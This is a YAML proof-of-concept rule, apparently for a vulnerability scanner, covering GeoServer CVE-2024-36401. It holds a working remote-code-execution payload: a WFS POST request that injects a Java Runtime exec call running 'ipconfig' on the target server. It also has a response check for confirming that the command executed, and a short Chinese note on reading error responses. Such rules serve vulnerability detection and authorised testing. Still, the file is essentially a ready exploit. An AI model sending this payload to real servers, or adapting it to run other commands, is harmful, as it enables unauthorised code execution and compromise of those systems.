name: poc-geoserver-cve-2024-36401-rce
rules:
  - method: POST
    path: "/geoserver/wfs"
    headers: 
      Accept-Encoding: gzip, deflate, br
      Accept-Language: en-US;q=0.9,en;q=0.8
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
      Content-Type: application/xml
    body: "
        <wfs:GetPropertyValue service='WFS' version='2.0.0'
        xmlns:topp='http://www.openplans.org/topp'
        xmlns:fes='http://www.opengis.net/fes/2.0'
        xmlns:wfs='http://www.opengis.net/wfs/2.0'>
          <wfs:Query typeNames='sf:archsites'/>
          <wfs:valueReference>
            exec(java.lang.Runtime.getRuntime(),'ipconfig')</wfs:valueReference>
        </wfs:GetPropertyValue>
        "
    expression: |
      response.status == 400 && response.body.bcontains(b'java.lang.ProcessImpl')
detail:
  author: fliggy
  descriptions: 只对POST类型进行测试，如果回显500且包含No such attribute则是因为系统不存在对应的命令